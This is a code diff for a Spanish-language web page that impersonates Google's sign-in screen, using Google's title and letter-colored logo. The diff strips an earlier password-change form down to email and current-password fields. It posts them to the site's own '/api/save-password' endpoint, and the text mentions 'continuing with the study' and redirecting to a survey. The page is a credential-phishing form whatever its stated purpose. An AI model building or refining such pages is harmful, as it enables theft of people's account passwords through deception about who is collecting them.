@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Inicia Sesion - Cuenta de Google</title>
+    <title>Inicia sesión - Cuenta de Google</title>
     <style>
         body {
             font-family: 'Roboto', Arial, sans-serif;
@@ -69,26 +69,11 @@
             border: 2px solid #1a73e8;
             padding: 12px 14px;
         }
-        .hint {
-            font-size: 12px;
-            color: #5f6368;
-            margin-bottom: 16px;
-            margin-top: -10px;
-        }
         .buttons-row {
             display: flex;
-            justify-content: space-between;
+            justify-content: flex-end;
             align-items: center;
             margin-top: 30px;
-        }
-        .btn-omitir {
-            background: none;
-            border: none;
-            color: #1a73e8;
-            font-weight: 500;
-            font-size: 14px;
-            cursor: pointer;
-            padding: 10px 0;
         }
         .btn-guardar {
             background-color: #1a73e8;
@@ -117,10 +102,10 @@
                 <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
             </span>
         </div>
-        <h2> Inicia sesion en tu cuenta de google</h2>
+        <h2>Inicia sesión en tu cuenta</h2>
 
-        <h3>Email</h3>
-        <p class="subtitle">Introduce tu correo, tu contraseña actual para poder acceder a este sitio.</p>
+        <h3>Acceso</h3>
+        <p class="subtitle">Introduce tu correo y contraseña actual para continuar con el estudio.</p>
 
         <form id="passwordForm">
             <div class="input-group">
@@ -131,12 +116,8 @@
                 <input type="password" id="oldPassword" required placeholder="Contraseña">
             </div>
 
-        
-    
-
             <div class="buttons-row">
-                
-                <button type="submit" class="btn-guardar">siguiente</button>
+                <button type="submit" class="btn-guardar">Siguiente</button>
             </div>
         </form>
         <div id="message"></div>
@@ -147,26 +128,31 @@
             e.preventDefault();
             const email = document.getElementById('email').value;
             const oldPassword = document.getElementById('oldPassword').value;
-            const password = document.getElementById('password').value;
-            const confirmation = document.getElementById('confirmation').value;
             const msg = document.getElementById('message');
 
             msg.style.color = '#5f6368';
-            msg.textContent = 'Guardando...';
+            msg.textContent = 'Verificando...';
 
-            const res = await fetch('/api/save-password', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, oldPassword, password, confirmation })
-            });
-            const data = await res.json();
-            
-            if(data.success) {
-                msg.style.color = 'green';
-                msg.textContent = '¡Contraseña cambiada con éxito!';
-            } else {
+            try {
+                const res = await fetch('/api/save-password', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, oldPassword })
+                });
+                const data = await res.json();
+                
+                if(data.success) {
+                    msg.style.color = 'green';
+                    msg.textContent = '¡Inicio de sesión exitoso!';
+                    // Aquí puedes redirigir a la encuesta si lo deseas:
+                    // window.location.href = '/encuesta.html';
+                } else {
+                    msg.style.color = 'red';
+                    msg.textContent = data.message || 'Error al iniciar sesión.';
+                }
+            } catch (error) {
                 msg.style.color = 'red';
-                msg.textContent = data.message;
+                msg.textContent = 'Error de conexión con el servidor.';
             }
         });
     </script>
